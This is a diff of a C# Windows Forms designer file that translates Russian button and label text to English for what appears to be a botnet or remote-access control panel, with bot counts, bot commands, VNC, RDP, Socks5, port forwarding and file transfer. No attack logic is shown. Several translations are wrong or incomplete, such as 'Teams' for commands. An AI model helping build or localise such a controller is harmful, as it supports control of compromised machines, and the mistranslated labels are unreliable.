@@ -153,7 +153,7 @@
 			this.btRefresh.Name = "btRefresh";
 			this.btRefresh.Size = new System.Drawing.Size(75, 23);
 			this.btRefresh.TabIndex = 0;
-			this.btRefresh.Text = "Обновить";
+			this.btRefresh.Text = "Refresh";
 			this.btRefresh.UseVisualStyleBackColor = true;
 			this.btRefresh.Click += new System.EventHandler(this.btRefresh_Click);
 			// 
@@ -241,7 +241,7 @@
 			// 
 			this.itemToGroup.Name = "itemToGroup";
 			this.itemToGroup.Size = new System.Drawing.Size(122, 22);
-			this.itemToGroup.Text = "В группу";
+			this.itemToGroup.Text = "In group";
 			// 
 			// panel2
 			// 
@@ -268,7 +268,7 @@
 			this.label1.Name = "label1";
 			this.label1.Size = new System.Drawing.Size(101, 13);
 			this.label1.TabIndex = 0;
-			this.label1.Text = "Количество ботов:";
+			this.label1.Text = "Number of bots:";
 			// 
 			// tbLog
 			// 
@@ -323,7 +323,7 @@
 			this.btDelGroup.Name = "btDelGroup";
 			this.btDelGroup.Size = new System.Drawing.Size(112, 23);
 			this.btDelGroup.TabIndex = 3;
-			this.btDelGroup.Text = "Удалить группу";
+			this.btDelGroup.Text = "Delete group";
 			this.btDelGroup.UseVisualStyleBackColor = true;
 			this.btDelGroup.Click += new System.EventHandler(this.btDelGroup_Click);
 			// 
@@ -333,7 +333,7 @@
 			this.btAddGroup.Name = "btAddGroup";
 			this.btAddGroup.Size = new System.Drawing.Size(112, 23);
 			this.btAddGroup.TabIndex = 2;
-			this.btAddGroup.Text = "Добавить группу";
+			this.btAddGroup.Text = "Add a group";
 			this.btAddGroup.UseVisualStyleBackColor = true;
 			this.btAddGroup.Click += new System.EventHandler(this.btAddGroup_Click);
 			// 
@@ -351,7 +351,7 @@
 			this.label7.Name = "label7";
 			this.label7.Size = new System.Drawing.Size(71, 13);
 			this.label7.TabIndex = 0;
-			this.label7.Text = "Имя группы:";
+			this.label7.Text = "Group name:";
 			// 
 			// tableLayoutPanel3
 			// 
@@ -450,7 +450,7 @@
 			this.btComment.Name = "btComment";
 			this.btComment.Size = new System.Drawing.Size(89, 23);
 			this.btComment.TabIndex = 8;
-			this.btComment.Text = "Комментарий";
+			this.btComment.Text = "Comment";
 			this.btComment.UseVisualStyleBackColor = true;
 			this.btComment.Click += new System.EventHandler(this.btComment_Click);
 			// 
@@ -491,7 +491,7 @@
 			this.label5.Name = "label5";
 			this.label5.Size = new System.Drawing.Size(38, 13);
 			this.label5.TabIndex = 6;
-			this.label5.Text = "Инфо:";
+			this.label5.Text = "Info:";
 			// 
 			// tbIP
 			// 
@@ -519,7 +519,7 @@
 			this.label4.Name = "label4";
 			this.label4.Size = new System.Drawing.Size(64, 13);
 			this.label4.TabIndex = 4;
-			this.label4.Text = "Состояние:";
+			this.label4.Text = "condition:";
 			// 
 			// panel4
 			// 
@@ -561,7 +561,7 @@
 			this.groupBox1.Size = new System.Drawing.Size(716, 119);
 			this.groupBox1.TabIndex = 0;
 			this.groupBox1.TabStop = false;
-			this.groupBox1.Text = "Команды";
+			this.groupBox1.Text = "Teams";
 			// 
 			// label8
 			// 
@@ -570,7 +570,7 @@
 			this.label8.Name = "label8";
 			this.label8.Size = new System.Drawing.Size(30, 13);
 			this.label8.TabIndex = 41;
-			this.label8.Text = "мин.";
+			this.label8.Text = "min.";
 			// 
 			// tbSleepMin
 			// 
@@ -585,7 +585,7 @@
 			this.btSleep.Name = "btSleep";
 			this.btSleep.Size = new System.Drawing.Size(75, 23);
 			this.btSleep.TabIndex = 39;
-			this.btSleep.Text = "Заснуть";
+			this.btSleep.Text = "Fall asleep";
 			this.btSleep.UseVisualStyleBackColor = true;
 			this.btSleep.Click += new System.EventHandler(this.btSleep_Click);
 			// 
@@ -595,7 +595,7 @@
 			this.btOff.Name = "btOff";
 			this.btOff.Size = new System.Drawing.Size(75, 23);
 			this.btOff.TabIndex = 38;
-			this.btOff.Text = "Отключить";
+			this.btOff.Text = "Turn off";
 			this.btOff.UseVisualStyleBackColor = true;
 			this.btOff.Click += new System.EventHandler(this.btOff_Click);
 			// 
@@ -616,7 +616,7 @@
 			this.btnPlayer.Name = "btnPlayer";
 			this.btnPlayer.Size = new System.Drawing.Size(50, 24);
 			this.btnPlayer.TabIndex = 36;
-			this.btnPlayer.Text = "плеер";
+			this.btnPlayer.Text = "player";
 			this.btnPlayer.UseVisualStyleBackColor = true;
 			this.btnPlayer.Click += new System.EventHandler(this.btnPlayer_Click);
 			// 
@@ -637,7 +637,7 @@
 			this.openVNCbtn.Name = "openVNCbtn";
 			this.openVNCbtn.Size = new System.Drawing.Size(104, 23);
 			this.openVNCbtn.TabIndex = 34;
-			this.openVNCbtn.Text = "Полноэкр. VNC";
+			this.openVNCbtn.Text = "Fullscreen. VNC";
 			this.openVNCbtn.UseVisualStyleBackColor = true;
 			this.openVNCbtn.Click += new System.EventHandler(this.openVNCBtn_Click);
 			// 
@@ -648,7 +648,7 @@
 			this.fullScreenBtn.Name = "fullScreenBtn";
 			this.fullScreenBtn.Size = new System.Drawing.Size(104, 24);
 			this.fullScreenBtn.TabIndex = 34;
-			this.fullScreenBtn.Text = "Полноэкр. видео";
+			this.fullScreenBtn.Text = "Fullscreen. видео";
 			this.fullScreenBtn.UseVisualStyleBackColor = true;
 			this.fullScreenBtn.Click += new System.EventHandler(this.fullScreenBtn_Click);
 			// 
@@ -668,7 +668,7 @@
 			this.btFileTransfer.Name = "btFileTransfer";
 			this.btFileTransfer.Size = new System.Drawing.Size(114, 23);
 			this.btFileTransfer.TabIndex = 32;
-			this.btFileTransfer.Text = "Файл трансфер";
+			this.btFileTransfer.Text = "File transfer";
 			this.btFileTransfer.UseVisualStyleBackColor = true;
 			this.btFileTransfer.Click += new System.EventHandler(this.btFileTransfer_Click);
 			// 
@@ -697,7 +697,7 @@
 			this.label6.Name = "label6";
 			this.label6.Size = new System.Drawing.Size(33, 13);
 			this.label6.TabIndex = 29;
-			this.label6.Text = "порт:";
+			this.label6.Text = "port:";
 			// 
 			// btRunVNC
 			// 
@@ -715,7 +715,7 @@
 			this.btOnlineVideo.Name = "btOnlineVideo";
 			this.btOnlineVideo.Size = new System.Drawing.Size(94, 23);
 			this.btOnlineVideo.TabIndex = 27;
-			this.btOnlineVideo.Text = "Онлайн видео";
+			this.btOnlineVideo.Text = "Online video";
 			this.btOnlineVideo.UseVisualStyleBackColor = true;
 			this.btOnlineVideo.Click += new System.EventHandler(this.btOnlineVideo_Click);
 			// 
@@ -732,7 +732,7 @@
 			this.btCmdBot.Name = "btCmdBot";
 			this.btCmdBot.Size = new System.Drawing.Size(94, 23);
 			this.btCmdBot.TabIndex = 25;
-			this.btCmdBot.Text = "Команда боту";
+			this.btCmdBot.Text = "Team bot";
 			this.btCmdBot.UseVisualStyleBackColor = true;
 			this.btCmdBot.Click += new System.EventHandler(this.btCmdBot_Click);
 			// 
@@ -742,7 +742,7 @@
 			this.btStartSocks5.Name = "btStartSocks5";
 			this.btStartSocks5.Size = new System.Drawing.Size(108, 23);
 			this.btStartSocks5.TabIndex = 24;
-			this.btStartSocks5.Text = "Старт Socks5";
+			this.btStartSocks5.Text = "Start Socks5";
 			this.btStartSocks5.UseVisualStyleBackColor = true;
 			this.btStartSocks5.Click += new System.EventHandler(this.btStartSocks5_Click);
 			// 
@@ -759,7 +759,7 @@
 			this.btPortForward.Name = "btPortForward";
 			this.btPortForward.Size = new System.Drawing.Size(108, 23);
 			this.btPortForward.TabIndex = 22;
-			this.btPortForward.Text = "Проброс порта";
+			this.btPortForward.Text = "Port forwarding";
 			this.btPortForward.UseVisualStyleBackColor = true;
 			this.btPortForward.Click += new System.EventHandler(this.btPortForward_Click);
 			// 
@@ -769,7 +769,7 @@
 			this.btClosePortForward.Name = "btClosePortForward";
 			this.btClosePortForward.Size = new System.Drawing.Size(252, 23);
 			this.btClosePortForward.TabIndex = 21;
-			this.btClosePortForward.Text = "Закрыть проброс порта";
+			this.btClosePortForward.Text = "Close port forwarding";
 			this.btClosePortForward.UseVisualStyleBackColor = true;
 			this.btClosePortForward.Click += new System.EventHandler(this.btClosePortForward_Click);
 			// 
@@ -779,7 +779,7 @@
 			this.btRunRDP.Name = "btRunRDP";
 			this.btRunRDP.Size = new System.Drawing.Size(114, 23);
 			this.btRunRDP.TabIndex = 20;
-			this.btRunRDP.Text = "Запустить RDP";
+			this.btRunRDP.Text = "Run RDP";
 			this.btRunRDP.UseVisualStyleBackColor = true;
 			this.btRunRDP.Click += new System.EventHandler(this.btRunRDP_Click);
 			// 
@@ -799,13 +799,13 @@
             this.itemConfig});
 			this.сервисToolStripMenuItem.Name = "сервисToolStripMenuItem";
 			this.сервисToolStripMenuItem.Size = new System.Drawing.Size(59, 20);
-			this.сервисToolStripMenuItem.Text = "Сервис";
+			this.сервисToolStripMenuItem.Text = "Service";
 			// 
 			// itemConfig
 			// 
 			this.itemConfig.Name = "itemConfig";
 			this.itemConfig.Size = new System.Drawing.Size(134, 22);
-			this.itemConfig.Text = "Настройки";
+			this.itemConfig.Text = "Settings";
 			this.itemConfig.Click += new System.EventHandler(this.itemConfig_Click);
 			// 
 			// timerUpdateBots
@@ -822,7 +822,7 @@
 			this.Controls.Add(this.menuStrip1);
 			this.MainMenuStrip = this.menuStrip1;
 			this.Name = "FormMain";
-			this.Text = "Командный менеджер";
+			this.Text = "Team manager";
 			this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.FormMain_FormClosed);
 			this.Load += new System.EventHandler(this.FormMain_Load);
 			this.tableLayoutPanel1.ResumeLayout(false);
